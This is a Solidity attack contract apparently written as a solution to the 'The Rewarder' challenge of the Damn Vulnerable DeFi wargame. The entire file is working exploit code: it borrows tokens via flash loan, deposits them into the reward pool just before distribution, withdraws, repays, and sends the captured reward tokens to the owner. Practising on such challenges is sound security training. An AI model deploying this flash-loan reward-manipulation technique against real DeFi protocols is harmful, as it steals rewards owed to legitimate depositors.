// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract EvilContractRewarder {
    using Address for address;
    address payable owner;
    FlashLoanerPool immutable loanPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool immutable rewardPool;
    RewardToken immutable rewardToken;

    constructor (address _loanPool, address token, address _rewardPool, address _rewardToken) {
        owner = payable(msg.sender);
        loanPool = FlashLoanerPool(_loanPool);
        liquidityToken = DamnValuableToken(token);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 amt) public {
        require(msg.sender == owner, "Forbidden");
        loanPool.flashLoan(amt);
    }

    function receiveFlashLoan(uint256 amount) public payable {
        _useLoan(amount);
        liquidityToken.transfer(msg.sender, amount);
    }

    function _useLoan(uint256 amt) private {
        console.log("loan use timestamp:\t%d", block.timestamp);
        liquidityToken.approve(address(rewardPool), amt);
        rewardPool.deposit(amt);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amt);
        uint bal = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, bal);
    }
}
